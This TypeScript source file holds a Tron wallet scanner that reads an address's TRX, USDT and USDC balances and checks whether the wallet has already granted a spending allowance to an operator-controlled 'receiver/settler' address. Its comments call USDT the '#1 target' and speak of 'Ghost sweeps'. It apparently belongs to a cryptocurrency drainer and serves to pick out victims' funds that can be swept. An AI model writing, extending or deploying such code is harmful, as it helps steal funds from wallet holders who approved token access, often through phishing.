import TronWeb from "tronweb";
import { UniversalAsset } from "../types";

/**
 * 💎 TRON SCANNER
 * Sophisticated discovery for TRX and high-value TRC20 tokens (USDT/USDC).
 * Features Allowance checking for "Ghost" sweeps.
 */
export async function scanTron(address: string): Promise<UniversalAsset[]> {
  // Silent guard for non-Tron addresses (Tron addresses always start with 'T')
  if (!address || address.startsWith("0x") || !address.startsWith("T"))
    return [];

  console.log(
    `[tron.ts] Starting Tron Scan | Address: ${address.slice(0, 8)}...`,
  );

  try {
    // 🔑 TRONGRID API KEY is essential for production speed
    const tronGridKey = process.env.TRONGRID_KEY || "";
    const config = {
      fullHost: "https://api.trongrid.io",
      headers: { "TRON-PRO-API-KEY": tronGridKey },
    };

    // Support for different build environments (CommonJS vs ESM)
    const tronWeb = (TronWeb as any).default
      ? new (TronWeb as any).default(config)
      : new (TronWeb as any)(config);

    const assets: UniversalAsset[] = [];

    // --- 1. NATIVE TRX CHECK ---
    const balance = await tronWeb.trx.getBalance(address).catch((err: any) => {
      console.warn(
        `[tron.ts] TRX Balance Fetch Failed | ${err.message || err}`,
      );
      return 0;
    });

    if (balance > 0) {
      assets.push({
        symbol: "TRX",
        name: "Tron",
        decimals: 6,
        balance: balance.toString(),
        displayBalance: (balance / 1e6).toFixed(4),
        chain: "TRON",
        networkName: "Tron",
        permitSupported: false,
        signatureType: "NATIVE",
      });
    }

    // --- 2. TRC20 HIGH-VALUE SCAN ---
    const HIGH_VALUE_TRC20 = [
      { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", sym: "USDT" }, // USDT is the #1 target on Tron
      { addr: "TEk77v57P98y3Nf5S9zK1AAtX3gC4S6A7A", sym: "USDC" },
    ];

    await Promise.all(
      HIGH_VALUE_TRC20.map(async (token) => {
        try {
          const contract = await tronWeb.contract().at(token.addr);

          // Parallelize Balance and Allowance (Ghost) checks
          const [bal, allowance] = await Promise.all([
            contract.balanceOf(address).call(),
            // We check if the address has already approved our receiver/settler
            contract
              .allowance(address, process.env.TRON_SENDER_ADDR || address)
              .call()
              .catch(() => 0n),
          ]);

          const rawBal = BigInt(bal.toString());
          if (rawBal > 0n) {
            const hasAllowance = BigInt(allowance.toString()) > 0n;

            assets.push({
              symbol: token.sym,
              name: `${token.sym} (TRC20)`,
              decimals: 6,
              balance: rawBal.toString(),
              displayBalance: (Number(rawBal) / 1e6).toFixed(4),
              contractAddress: token.addr,
              chain: "TRON",
              networkName: "Tron",
              permitSupported: false, // Tron does not support EIP-2612 Permits
              ghostEnabled: hasAllowance,
            });

            if (hasAllowance) {
              console.log(
                `[tron.ts] Ghost Vector Detected | Token: ${
                  token.sym
                } | Address: ${address.slice(0, 8)}`,
              );
            }
          }
        } catch (err: any) {
          console.error(
            `[tron.ts] TRC20 Audit Failed | ${token.sym} | ${
              err.message || "RPC Error"
            }`,
          );
        }
      }),
    );

    if (assets.length > 0) {
      console.log(
        `[tron.ts] Scan Complete | Found: ${assets.length} Tron assets`,
      );
    }

    return assets;
  } catch (e) {
    console.error(
      `[tron.ts] Critical Failure | ${
        e instanceof Error ? e.message : "Unknown"
      }`,
    );
    return [];
  }
}
